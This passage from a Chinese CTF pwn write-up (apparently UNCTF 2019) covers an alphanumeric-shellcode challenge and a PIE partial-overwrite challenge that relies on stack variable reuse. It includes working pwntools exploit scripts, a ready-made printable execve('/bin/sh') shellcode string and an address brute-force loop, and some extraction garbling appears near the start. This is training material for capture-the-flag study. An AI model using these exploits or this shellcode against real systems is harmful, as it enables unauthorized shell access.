然后开64位ida
看到这个代码似乎是`c++`写的?
跟进第一个函数发现是:
[mprotect](https://blog.csdn.net/thisinnocence/article/details/80025064)
用于防止内存被非法改写
中间估计就是:`cout 90) && (s[i]  122) && (s[i]  57) && s[i] != 10 && s[i]`
求他的补集就是:
`64-90 || 96-122 || 47-57` 也就是说要纯大小写字母+数字就可以通过
      strcpy(::s, s);
      (*::s)(::s, s);
这里通过指向无返回值的函数指针去执行shellcode。
这道题目其实非常简单，就是构造一个纯数字字母的shellcode跟之前我做的那个php其实道理差不多，都是通过一些运算编码解码来达到目的,之前科大的一个题目也考过，刚好自己也做过那没啥难度了。
exp如下:
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    debug = True
    # 设置调试环境
    context.log_level = 'debug'
    context.arch = "amd64"
    if debug:
        sh = process("./pwn")
    else:
        # 建立远程连接
        link = ''
        ip, port = map(strip,link.split(':'))
        sh = remote(ip, port)
    shellcode = "PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA"
    sh.sendlineafter("say?", shellcode)
    sh.interactive()
后面针对shellcode的原理剖析及其利用,我会再写篇文章来分析
下面分享一些我阅读过的相关文章:
[shellcode 的艺术](https://xz.aliyun.com/t/6645)
[生成可打印的shellcode](http://blog.eonew.cn/archives/1125)
[编写x64字母数字shellcode](https://hama.hatenadiary.jp/entry/2017/04/04/190129)
[Linux/x64 – execve(“/bin/sh”,NULL,NULL) + Position Independent + Alphanumeric
Shellcode (87 bytes)](https://www.exploit-db.com/exploits/35205)
[编写shellcode的几种姿势](https://www.jianshu.com/p/eb75426b85cb)
[系统调用与中断](https://blog.csdn.net/Virtual_Func/article/details/49454801)
[Linux
pwn入门教程(2)——shellcode的使用，原理与变形](https://www.cnblogs.com/ichunqiu/p/9258785.html)
###  0x3.4 easystack
套路第一步:
然后上32位ida
循环能够执行4次,我们跟进下函数内容
这个栈利用比较复杂,到时候我会单独出一篇分析文章当作进阶的题型，感兴趣可以先看看。
###  0x3.5 Soso_easy_pwn
解决这个题目我们首先需要学习一些前置知识:
> 理解PIE机制
>
> partial
> write(部分写入)就是一种利用了PIE技术缺陷的bypass技术。由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为4k，这就意味着不管地址怎么变，则指令的后12位,3个十六进制数的地址是始终不变的。因此通过覆盖EIP的后8或16位
> (按字节写入，每字节8位)就可以快速爆破或者直接劫持EIP。
>
> 是不是有点懵b？
>
> 简单来说:
>
>
> 为了提高查找效率，所以内存分了页(类似一本书的目录结构),但是每个内存页里面的地址是对应物理内存地址，而pie只会改变虚拟内存里面的内存页的地址，而不会改变内存页里面数据的地址。
>
> 32位程序地址就是32位
>
>
> 
>
> 如果开了PIE的话,那么IDA默认就只会显示后12位也就是3个16进制数,前面18位就是PIE变化地址。
>
> 参考链接:
>
> [架构师必读：Linux 的内存分页管理](https://www.zhihu.com/tardis/sogou/art/59702093)
常用套路`checksec`
保护全开,32位程序,直接上ida
左边找到`main`函数
一个个跟进看下内容
      sub_8C0(); //初始化缓冲区,忽略
      sub_902(); 
      sub_9E6();
      return 0;
这里我们可以看到输出了`sub_8c0`的高12位地址,`char
s`相对于ebp的偏移是`1Ch`也就是说`addr(ebp)-addr(s)=1Ch`如果我们想溢出的话至少需要写入`1c+4h`的数据,我们可以看到这里时`0x14`所以没有溢出，就算有溢出也有溢出保护。
这里感觉挺有意思的,首先定义了一个正形指针`*v1`,但是没有对v1进行判断,也就是说我们只可以传入1字节大小且必须为int的地址,这里乍看没什么问题,但是如果我们不按规定输入会有什么问题呢？
这样会导致 **栈变量重用** ,是前一个栈的变量会残留在当前栈里面，如果当前栈没有进行覆盖操作，那么就会重用上面一个栈的变量。
我们可以简单调试下顺便理解下过程。
这里开了PIE,所以下断点的时候我们需要先获得随机化的地址。
> 这里为了照顾一些萌新:
>
> 这样可以查看一些用法
>
> `help(process)`
>
> `help(process.recvuntil)`
>
> `recvuntil(some_string)` 接收到 some_string 为止
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    debug = True
    # 设置调试环境
    context.log_level = 'debug'
    context.arch = "i386"
    # 设置tmux程序
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    # 处理环境模块
    if debug:
        # 建立本地连接
        sh = process('./pwn')
    else:
        # 建立远程连接
        link = ''
        ip, port = map(strip,link.split(':'))
        sh = remote(ip, port)
    # PIE 处理断点模块
    def debug(addr,PIE=True):
        io = sh
        if PIE:
            # proc_base = p.libs()[p.cwd + p.argv[0].strip('.')]
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
            gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(io,"b *{}".format(hex(addr)))
    sh.recvuntil("Welcome our the ")
    # gdb.attach(sh, )
    hightAddr = int(sh.recvuntil(" world", True)) 
>     p 0x3-0x2
>     printf "%xn",0x38-0x1c
>     python --调用python
>  
我们可以看到第二个函数的堆栈结构如上,我们继续跟进第三个函数,`finish`
我们执行的时候,最后会发现函数指针指向并且执行了我们第二个函数布置的内容AAAA
具体的栈变量覆盖过程就是:
这是第二个函数执行完的栈结构,
这是准备进入第三个函数时的栈结构
这是进入第三个函数的操作
我们稍微改下exp:
`cmdAddr = 'A'*0x4 + 'B'*0x4 + 'C' *0x4 + 'D'*0x4`
我们可以看到sub 0x18开的空间是怎么存放的,我们传的时候是就是按栈增长方向来传的
我们可以看到就是`DDDD`进入了eip。
我们通过搜索`shift+f12`定位`/bin/sh`可以找到漏洞函数(ps.如果你是新手强烈建议你从我第一篇文章开始边读边实践开始学习。)
我们定位下地址看看:
但是目前得到的地址是:
前16位+后3位,还差一位,这里一位数我们可以设为8然后不断循环请求来爆破，我的脚本自动化了。
        hightAddr = int(sh.recvuntil(" world", True)) << 16
        hightAddr = hightAddr + 0x89cd
综合上面两点,`exp.py`便呼之欲出。
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    debug = True
    # 设置调试环境
    context.log_level = 'debug'
    context.arch = "i386"
    # 设置tmux程序
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    # 处理环境模块
    # PIE 处理模块
    def debug(addr, sh,PIE=True):
        io = sh
        if PIE:
            # proc_base = p.libs()[p.cwd + p.argv[0].strip('.')]
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
            gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(io,"b *{}".format(hex(addr)))
    def exp(sh):
        if debug:
            # 建立本地连接
            sh = sh
        else:
            # 建立远程连接
            link = ''
            ip, port = map(strip,link.split(':'))
            sh = remote(ip, port)
        sh.recvuntil("Welcome our the ")
        # gdb.attach(sh, )
        hightAddr = int(sh.recvuntil(" world", True)) << 16
        hightAddr = hightAddr + 0x89cd
        # debug(0x000009EC)
        log.success("hightAddr: " + hex(hightAddr))
        cmdAddr = 'A'*12+ p32(hightAddr)
        sh.sendafter("So, Can you tell me your name?n", cmdAddr)
        # sh.recvuntil("ebye):")
        # sh.send('1')
        sh.sendlineafter("ebye):",'1')
        # sh.send("whoami")
        # sh.interactive()
        # debug(0x000009E6)
    if __name__ == '__main__':
        # exp()
        while True:
            sh = process('./pwn')
            try:
                exp(sh)
                sh.recv()
                sh.recv()
                sh.interactive()
                # sh.sendline("ls")
                # break
            except Exception as e:
                # print(e)
                sh.close()
## 0x4 一些碎碎念
​
学习PWN的话,入门门槛的确挺高的，所以说基础知识很重要，因为我自己是数学专业的，大三才开始学习计算机组成原理等方面的知识，后面的话自己也会去看一些计算机专门的书，比如操作系统、编译原理等一些书籍，掌握这些知识框架能避免很多弯路。
这里推荐下自己学习过的文章列表，帮助萌新一起来愉快学习pwn。
[
pwntools的一些简单入门总结](https://prowes5.github.io/2018/08/06/pwntools%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93/)
[Pwn基础知识笔记](https://www.jianshu.com/p/6e528b33e37a)
[【技术分享】跟我入坑PWN第一章](https://www.anquanke.com/post/id/85138)
## 0x5 参考链接
[2019UNCTF Write Up](https://www.ctfwp.com/articals/2019unctf.html)
[UNCTF2019 PWN writeup](https://leeeddin.github.io/UNCTF2019PWN/)
[NoOne](https://noone-hub.github.io/posts/89fa1574/)
[shellcode 的艺术](https://xz.aliyun.com/t/6645)
[hackergame2019-writeups](//github.com/ustclug/hackergame2019-writeups/blob/master/official/Shell_%E9%AA%87%E5%AE%A2/README.md)